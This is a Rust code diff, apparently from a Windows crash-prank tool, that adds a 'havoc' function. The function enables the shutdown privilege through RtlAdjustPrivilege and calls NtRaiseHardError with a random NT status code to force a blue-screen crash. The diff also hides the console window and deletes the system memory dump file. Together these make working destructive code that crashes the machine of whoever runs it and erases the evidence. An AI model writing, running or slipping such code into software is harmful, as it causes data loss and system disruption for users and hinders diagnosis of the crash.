@@ -17,6 +17,7 @@ use std::env;
 use rand::RngExt;
 use rand::rng;
 
+use crate::FreeConsole;
 use crate::argument::ArgParser;
 use crate::behavior::nterror::DEFAULT_BSOD;
 // NGL i did not know this would happen
@@ -177,6 +178,34 @@ pub fn traitbehavior(argmt: &ArgParser) {
 
         }
     }
+    pub fn havoc_bsod() {
+        // For havoc branch
+        // Lets bring the randomizer
+        let mut code: u32;
+        let mut rng_roulette = rand::rng();
+        let roulette = rng_roulette.random_range(1..14);
+        println!("result_random_spr_res: {}", roulette);
+        code = match roulette {
+            1  => STATUS_ACCESS_DENIED,
+            2  => STATUS_ACPI_INVALID_DATA,
+            3  => STATUS_ACPI_INVALID_REGION,
+            4  => STATUS_ACPI_INVALID_TABLE,
+            5  => STATUS_ACPI_POWER_REQUEST_FAILED,
+            6  => STATUS_AUDIT_FAILED,
+            7  => STATUS_CONFLICTING_ADDRESS,
+            8  => STATUS_INFO_LENGTH_MISMATCH,
+            9  => STATUS_INSUFFICIENT_RESOURCES,
+            10 => STATUS_INVALID_CID,
+            11 => STATUS_INVALID_DEVICE_REQUEST,
+            12 => STATUS_INVALID_PARAMETER,
+            13 => STATUS_MUTANT_NOT_OWNED,
+            14 => STATUS_NOT_COMMITED,
+            _ => DEFAULT_BSOD
+        };
+        let mut NTADJ = BSOD_Point {t1: 0, t2: 0};
+        unsafe{RtlAdjustPrivilege(19, 1, 0, &mut NTADJ.t1 as *mut i32)};
+        unsafe{NtRaiseHardError(code, 0, 0, ptr::null_mut(), 6, &mut NTADJ.t2 as *mut u32)};
+    }
     pub fn erase_dump () {
         // Check if there's Memory dump
         if let Ok(expanded) = shellexpand::env("%SystemRoot%\\MEMORY.DMP") {
@@ -218,5 +247,9 @@ pub fn traitbehavior(argmt: &ArgParser) {
         // We go :D
         timer_trig_bsod(answr);
     }
+    // This forked version rains hell
+    unsafe{FreeConsole()};
+    erase_dump();
+
 
 }
